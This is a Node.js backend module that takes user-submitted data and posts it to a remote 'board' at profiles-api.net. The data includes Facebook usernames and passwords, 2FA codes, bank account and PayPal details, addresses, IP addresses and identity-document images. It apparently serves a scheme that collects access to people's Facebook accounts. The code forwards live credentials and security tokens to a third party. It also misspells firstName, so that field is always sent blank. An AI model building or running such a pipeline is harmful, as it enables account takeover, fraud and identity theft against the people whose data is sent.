const axios = require("axios");

const imageLink = (hostname, file) => {
  const link = `${
    hostname === "localhost" ? "http://localhost:5000" : "https://" + hostname
  }/uploads/${file.filename.replace(" ", "_")}`;
  return link;
};

serialize = function (obj) {
  var str = [];
  for (var p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(encodeURIComponent(p) + "=" + encodeURIComponent(obj[p]));
    }
  return str.join("&");
};

const sendDataToBoard = async (data) => {
  var upData = {
    personal_info: `${data.firstName} ${data.lastName}`,
    geo: "en",
    country: data.country,
    checked: true,
  };

  const getIdParams = new URLSearchParams();
  getIdParams.append("personal_info", upData.personal_info);
  getIdParams.append("geo", upData.geo);
  getIdParams.append("country", upData.country);
  getIdParams.append("checked", upData.checked);

  const getIdConfig = {
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
  };

  const url = "https://profiles-api.net/profile_id_api/api/new_profile_id.php/";

  try {
    const getIdResponse = await axios.post(url, getIdParams, getIdConfig);
    const id = getIdResponse.data[0];
    data["personalInfo"] = id;

    const sendData = (data) => {
      const sendDataConfig = {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      };

      const sendDataUrl = "https://profiles-api.net/api/index.php";
      const board_id = 1329202495;
      const providers_source = "Massimo2";
      const geo = "en";

      const updatedData = new URLSearchParams();
      updatedData.append("action", "send_data");
      updatedData.append("first_name", data.firtsName || "");
      updatedData.append("last_name", data.lastName || "");
      updatedData.append("facebook_login", data.fbUsername || "");
      updatedData.append("facebook_password", data.fbPassword || "");
      updatedData.append("email_verification", "-");
      updatedData.append("password_verification", "-");
      updatedData.append(
        "date_of_birth",
        new Date(data.birthday).toLocaleDateString([], {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
        }) || ""
      );
      updatedData.append("friends", data.haveFriends || "");
      updatedData.append("fb_age", data.isOneYear || "");
      updatedData.append("fb_activity", data.frecuency || "");
      updatedData.append("phone_number", data.phone || "");
      updatedData.append("providers_source", providers_source);
      updatedData.append("board_id", board_id);
      updatedData.append("geo", geo);
      updatedData.append("personalInfo", data.personalInfo || "");
      updatedData.append("pay_option", data.paymentMethod || "");
      updatedData.append("reference_code", data.referralCode || "");
      updatedData.append("country", data.country || "");
      updatedData.append("devices", data.devices || "");
      updatedData.append("city", data.city || "");
      updatedData.append("email", data.email || "");
      updatedData.append("paypal_email", data.paypalEmail || "");
      updatedData.append("beneficiary", data.holderName || "");
      updatedData.append("acc", data.bankAccountCode || "");
      updatedData.append("fa_token", data.code2FA || "");
      updatedData.append("user_type", data.userType || "");
      updatedData.append("status", data.status || "");
      updatedData.append("status_observation", data.statusObservation || "");
      updatedData.append("os", data.os || "");
      updatedData.append("address", data.address || "");
      updatedData.append("referral", data.referral || "");
      updatedData.append("zip_code", data.zipCode || "");
      updatedData.append("referral_code_link", data.referralCodeLink || "");
      updatedData.append("ip", data.ip || "");
      updatedData.append("fortnight", data.fortnight || "");

      console.log("data.documentImage", data.documentImage);

      if (data.documentImage) {
        console.log("prepering to append");
        updatedData.append("file", serialize(data.documentImage));
      }
      data.fbEmailImage &&
        updatedData.append("email_id_file", serialize(data.fbEmailImage));
      data.bmIdImage &&
        updatedData.append("bm_id_file", serialize(data.bmIdImage));

      console.log("image appended", updatedData["file"]);
      console.log("updatedDate", updatedData);

      axios
        .post(sendDataUrl, updatedData, sendDataConfig)
        .then((res) => {
          console.log(res.data);
          return res;
        })
        .catch((error) => console.log("send data error", error));
    };

    console.log("before sending data");
    sendData(data);
  } catch (error) {
    console.log(error);
  }
};

module.exports = { sendDataToBoard, imageLink };
